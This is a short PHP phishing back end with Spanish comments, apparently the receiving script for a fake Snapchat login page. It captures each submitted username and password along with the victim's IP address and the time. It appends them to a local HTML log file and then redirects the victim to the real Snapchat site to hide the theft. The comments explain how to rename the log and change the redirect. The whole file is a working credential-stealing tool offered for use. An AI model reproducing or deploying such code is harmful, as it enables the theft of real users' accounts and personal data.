<?php

$steal = $_POST['username']; 
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR']; /*capturamos la ip*/



@$arzaex = date("m/d/Y",time()); /*capturamos fecha y hora a la cual ingreso (configurar pais)*/

@$harzaeh = date ("g:i:s A",time());



$f = fopen("arzae.html", "a"); /*crea un archivo html donde se guarda las cuentas , podemos cambiarle el nombre si lo deseamos , pero tambien debes cambiarle el nombre al html.*/

fwrite ($f,
'Usuario: [<b><font color="#00FF1A">'.$steal.'</font></b>]  
 Contraseña: [<b><font color="#F7FF00">'.$password.'</font></b>]
 IP: [<b><font color="#FF9DBB">'.$ip.'</font></b>] 
 Fecha: [<b><font color="#9DFFE">'.$arzaex.'</font></b>] 
  Hora: [<b><font color="##00E2FF">'.$harzaeh.'</font></b>]  <br></center><center>
 ');
fclose($f);
header("Location: https://www.snapchat.com"); /*esto es lo que redirije a otra pagina cuando el usuario inicia sesion , en este caso abre la app de snapchat podemos configurar para que agregue a otro usuario*/


?>
